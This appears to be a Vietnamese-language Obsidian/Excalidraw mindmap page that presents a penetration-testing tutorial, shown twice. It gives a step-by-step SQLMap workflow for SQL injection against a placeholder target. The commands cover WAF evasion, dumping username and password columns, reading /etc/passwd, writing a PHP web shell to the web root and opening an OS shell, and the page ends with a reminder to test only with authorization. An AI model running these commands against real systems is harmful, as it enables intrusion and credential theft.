---
title: "workflow sql map"
tags:
  - excalidraw
  - mindmap
---


<div class="excalidraw-container" id="ex-d4ec5f4a">
  <div class="excalidraw-toolbar">
    <div class="excalidraw-badge">
      <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect><circle cx="8.5" cy="8.5" r="1.5"></circle><polyline points="21 15 16 10 5 21"></polyline></svg>
      <span>Excalidraw Mindmap</span>
    </div>
    <div class="excalidraw-controls">
      <button type="button" class="excalidraw-btn zoom-in" title="Phóng to">🔍+</button>
      <button type="button" class="excalidraw-btn zoom-out" title="Thu nhỏ">🔍-</button>
      <button type="button" class="excalidraw-btn zoom-reset" title="Vừa màn hình">↺</button>
      <button type="button" class="excalidraw-btn fullscreen" title="Toàn màn hình">⛶</button>
    </div>
  </div>
  <div class="excalidraw-viewport">
    <div class="excalidraw-canvas-wrapper">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1062 2887" width="1062" height="2887" class="excalidraw-svg" data-width="1062" data-height="2887">
<g transform="translate(-279.09,94.36)">

<rect x="319.09188842773443" y="655.9700164794922" width="981.7486581588714" height="2095.8199615478516" rx="8" fill="#ffffff" stroke="#e0e0e0" stroke-width="1.5" class="excalidraw-md-bg"/>
<foreignObject x="319.09188842773443" y="655.9700164794922" width="981.7486581588714" height="2095.8199615478516" class="excalidraw-foreign-md">
  <div xmlns="http://www.w3.org/1999/xhtml" class="notion-embed-card">
    <div class="notion-embed-header">
      <div class="notion-embed-header-left">
        <span class="notion-embed-icon">📝</span>
        <span class="notion-embed-title">🔍 Workflow SQLMap chuẩn</span>
      </div>
      <a href="#doc-63133756e83bfdded55d6408077bdc911fc4f426" class="notion-embed-jump" title="Cuộn xuống đọc chi tiết toàn bộ nội dung">↓ Đọc bài viết</a>
    </div>
    <div class="notion-embed-body">
      <p>Dưới đây là <strong>workflow chuẩn</strong> khi sử dụng SQLMap để kiểm thử SQL injection, từ lúc bắt đầu cho đến khi khai thác dữ liệu (nếu có).</p>
<hr>
<h2>🔍 Workflow SQLMap chuẩn</h2>
<h3>Bước 1: Xác định mục tiêu và thu thập thông tin</h3>
<ul>
<li>Xác định URL hoặc request có chứa tham số có thể bị SQL injection.</li>
<li>Nếu có form đăng nhập, tìm kiếm, hoặc tham số trên URL (GET) hoặc trong body (POST).</li>
<li>Thu thập các header, cookie cần thiết (phiên đăng nhập, CSRF token...).</li>
<li>Dùng công cụ như <strong>Burp Suite</strong> để bắt request và lưu thành file <code>.txt</code> (nếu cần).</li>
</ul>
<h3>Bước 2: Kiểm tra nhanh khả năng injection (thủ công hoặc bằng SQLMap)</h3>
<ul>
<li><p>Dùng SQLMap với cấu hình cơ bản để phát hiện nhanh:</p>
<pre><code class="language-bash">sqlmap -u &quot;http://target.com/page.php?id=1&quot; --batch
</code></pre>
</li>
<li><p>Nếu có request phức tạp, lưu request vào file và dùng:</p>
<pre><code class="language-bash">sqlmap -r request.txt --batch
</code></pre>
</li>
<li><p>Quan sát kết quả: SQLMap sẽ báo có injection hay không, loại injection (boolean, error, time-based, union...).</p>
</li>
</ul>
<h3>Bước 3: Xác định loại DBMS và cấu hình nâng cao (nếu cần)</h3>
<ul>
<li>Nếu SQLMap không tự nhận diện được DBMS, chỉ định:<pre><code class="language-bash">sqlmap -u &quot;http://target.com/page.php?id=1&quot; --dbms=mysql --batch
</code></pre>
</li>
<li>Nếu gặp tường lửa (WAF), thử dùng <code>--tamper</code>:<pre><code class="language-bash">sqlmap -u &quot;http://target.com/page.php?id=1&quot; --tamper=between,randomcase --batch
</code></pre>
</li>
<li>Tăng mức kiểm tra nếu cần:<pre><code class="language-bash">sqlmap -u &quot;http://target.com/page.php?id=1&quot; --level=5 --risk=3 --batch
</code></pre>
</li>
</ul>
<h3>Bước 4: Lấy thông tin cơ bản về database</h3>
<ul>
<li>Lấy banner (phiên bản DBMS):<pre><code class="language-bash">sqlmap -u &quot;http://target.com/page.php?id=1&quot; --banner --batch
</code></pre>
</li>
<li>Lấy user hiện tại và quyền:<pre><code class="language-bash">sqlmap -u &quot;http://target.com/page.php?id=1&quot; --current-user --privileges --batch
</code></pre>
</li>
<li>Lấy danh sách databases:<pre><code class="language-bash">sqlmap -u &quot;http://target.com/page.php?id=1&quot; --dbs --batch
</code></pre>
</li>
</ul>
<h3>Bước 5: Chọn database và khai thác dữ liệu</h3>
<ul>
<li>Chọn database cần khai thác (ví dụ: <code>users_db</code>):<pre><code class="language-bash">sqlmap -u &quot;http://target.com/page.php?id=1&quot; -D users_db --tables --batch
</code></pre>
</li>
<li>Lấy danh sách cột của bảng quan tâm (ví dụ: <code>users</code>):<pre><code class="language-bash">sqlmap -u &quot;http://target.com/page.php?id=1&quot; -D users_db -T users --columns --batch
</code></pre>
</li>
<li>Trích xuất dữ liệu từ các cột cụ thể (ví dụ: <code>username, password</code>):<pre><code class="language-bash">sqlmap -u &quot;http://target.com/page.php?id=1&quot; -D users_db -T users -C username,password --dump --batch
</code></pre>
</li>
</ul>
<h3>Bước 6: Tùy chọn nâng cao (nếu được phép)</h3>
<ul>
<li><strong>Đọc file hệ thống:</strong><pre><code class="language-bash">sqlmap -u &quot;http://target.com/page.php?id=1&quot; --file-read=&quot;/etc/passwd&quot; --batch
</code></pre>
</li>
<li><strong>Ghi file lên server (thường để tạo shell):</strong><pre><code class="language-bash">sqlmap -u &quot;http://target.com/page.php?id=1&quot; --file-write=&quot;/local/shell.php&quot; --file-dest=&quot;/var/www/html/shell.php&quot; --batch
</code></pre>
</li>
<li><strong>Lấy OS shell:</strong><pre><code class="language-bash">sqlmap -u &quot;http://target.com/page.php?id=1&quot; --os-shell --batch
</code></pre>
</li>
</ul>
<h3>Bước 7: Lưu phiên và báo cáo</h3>
<ul>
<li>Lưu lại session để tiếp tục sau này:<pre><code class="language-bash">sqlmap -u &quot;http://target.com/page.php?id=1&quot; --batch -s sqlmap_session.sqlite
</code></pre>
</li>
<li>Resume phiên đã lưu:<pre><code class="language-bash">sqlmap --resume=sqlmap_session.sqlite
</code></pre>
</li>
<li>Xuất kết quả ra file (CSV, HTML):<pre><code class="language-bash">sqlmap -u &quot;http://target.com/page.php?id=1&quot; -D users_db -T users --dump --batch --csv=output.csv
</code></pre>
</li>
</ul>
<hr>
<h2>⚠️ Lưu ý quan trọng</h2>
<ul>
<li><strong>Chỉ thực hiện trên hệ thống bạn có quyền kiểm tra.</strong> Tấn công trái phép là vi phạm pháp luật.</li>
<li>Luôn có sự cho phép bằng văn bản trước khi pentest.</li>
<li>Theo dõi tốc độ request để tránh gây quá tải hoặc bị chặn (dùng <code>--delay</code>, <code>--threads</code> hợp lý).</li>
<li>Nếu gặp khó khăn, hãy tăng mức verbosity (<code>-v 3</code>) để xem chi tiết request/response.</li>
<li>Sử dụng proxy (Burp) khi cần phân tích sâu hơn:<pre><code class="language-bash">sqlmap -u &quot;http://target.com/page.php?id=1&quot; --proxy=&quot;http://127.0.0.1:8080&quot; --batch
</code></pre>
</li>
</ul>
<hr>
<p>Hy vọng workflow trên giúp bạn thực hiện kiểm thử SQL injection một cách bài bản và hiệu quả.</p>

    </div>
  </div>
</foreignObject>

</g>
</svg>
    </div>
  </div>
</div>


---

## 📖 Nội dung chi tiết bài viết (Writeup)

<div id="doc-63133756e83bfdded55d6408077bdc911fc4f426" class="notion-callout-card">

Dưới đây là **workflow chuẩn** khi sử dụng SQLMap để kiểm thử SQL injection, từ lúc bắt đầu cho đến khi khai thác dữ liệu (nếu có).

---

## 🔍 Workflow SQLMap chuẩn

### Bước 1: Xác định mục tiêu và thu thập thông tin

- Xác định URL hoặc request có chứa tham số có thể bị SQL injection.
- Nếu có form đăng nhập, tìm kiếm, hoặc tham số trên URL (GET) hoặc trong body (POST).
- Thu thập các header, cookie cần thiết (phiên đăng nhập, CSRF token...).
- Dùng công cụ như **Burp Suite** để bắt request và lưu thành file `.txt` (nếu cần).

### Bước 2: Kiểm tra nhanh khả năng injection (thủ công hoặc bằng SQLMap)

- Dùng SQLMap với cấu hình cơ bản để phát hiện nhanh:
  ```bash
  sqlmap -u "http://target.com/page.php?id=1" --batch
  ```
- Nếu có request phức tạp, lưu request vào file và dùng:
  ```bash
  sqlmap -r request.txt --batch
  ```

- Quan sát kết quả: SQLMap sẽ báo có injection hay không, loại injection (boolean, error, time-based, union...).

### Bước 3: Xác định loại DBMS và cấu hình nâng cao (nếu cần)

- Nếu SQLMap không tự nhận diện được DBMS, chỉ định:
  ```bash
  sqlmap -u "http://target.com/page.php?id=1" --dbms=mysql --batch
  ```
- Nếu gặp tường lửa (WAF), thử dùng `--tamper`:
  ```bash
  sqlmap -u "http://target.com/page.php?id=1" --tamper=between,randomcase --batch
  ```
- Tăng mức kiểm tra nếu cần:
  ```bash
  sqlmap -u "http://target.com/page.php?id=1" --level=5 --risk=3 --batch
  ```

### Bước 4: Lấy thông tin cơ bản về database

- Lấy banner (phiên bản DBMS):
  ```bash
  sqlmap -u "http://target.com/page.php?id=1" --banner --batch
  ```
- Lấy user hiện tại và quyền:
  ```bash
  sqlmap -u "http://target.com/page.php?id=1" --current-user --privileges --batch
  ```
- Lấy danh sách databases:
  ```bash
  sqlmap -u "http://target.com/page.php?id=1" --dbs --batch
  ```

### Bước 5: Chọn database và khai thác dữ liệu

- Chọn database cần khai thác (ví dụ: `users_db`):
  ```bash
  sqlmap -u "http://target.com/page.php?id=1" -D users_db --tables --batch
  ```
- Lấy danh sách cột của bảng quan tâm (ví dụ: `users`):
  ```bash
  sqlmap -u "http://target.com/page.php?id=1" -D users_db -T users --columns --batch
  ```
- Trích xuất dữ liệu từ các cột cụ thể (ví dụ: `username, password`):
  ```bash
  sqlmap -u "http://target.com/page.php?id=1" -D users_db -T users -C username,password --dump --batch
  ```

### Bước 6: Tùy chọn nâng cao (nếu được phép)

- **Đọc file hệ thống:**
  ```bash
  sqlmap -u "http://target.com/page.php?id=1" --file-read="/etc/passwd" --batch
  ```
- **Ghi file lên server (thường để tạo shell):**
  ```bash
  sqlmap -u "http://target.com/page.php?id=1" --file-write="/local/shell.php" --file-dest="/var/www/html/shell.php" --batch
  ```
- **Lấy OS shell:**
  ```bash
  sqlmap -u "http://target.com/page.php?id=1" --os-shell --batch
  ```

### Bước 7: Lưu phiên và báo cáo

- Lưu lại session để tiếp tục sau này:
  ```bash
  sqlmap -u "http://target.com/page.php?id=1" --batch -s sqlmap_session.sqlite
  ```
- Resume phiên đã lưu:
  ```bash
  sqlmap --resume=sqlmap_session.sqlite
  ```
- Xuất kết quả ra file (CSV, HTML):
  ```bash
  sqlmap -u "http://target.com/page.php?id=1" -D users_db -T users --dump --batch --csv=output.csv
  ```

---

## ⚠️ Lưu ý quan trọng

- **Chỉ thực hiện trên hệ thống bạn có quyền kiểm tra.** Tấn công trái phép là vi phạm pháp luật.
- Luôn có sự cho phép bằng văn bản trước khi pentest.
- Theo dõi tốc độ request để tránh gây quá tải hoặc bị chặn (dùng `--delay`, `--threads` hợp lý).
- Nếu gặp khó khăn, hãy tăng mức verbosity (`-v 3`) để xem chi tiết request/response.
- Sử dụng proxy (Burp) khi cần phân tích sâu hơn:
  ```bash
  sqlmap -u "http://target.com/page.php?id=1" --proxy="http://127.0.0.1:8080" --batch
  ```

---

Hy vọng workflow trên giúp bạn thực hiện kiểm thử SQL injection một cách bài bản và hiệu quả.

</div>

---

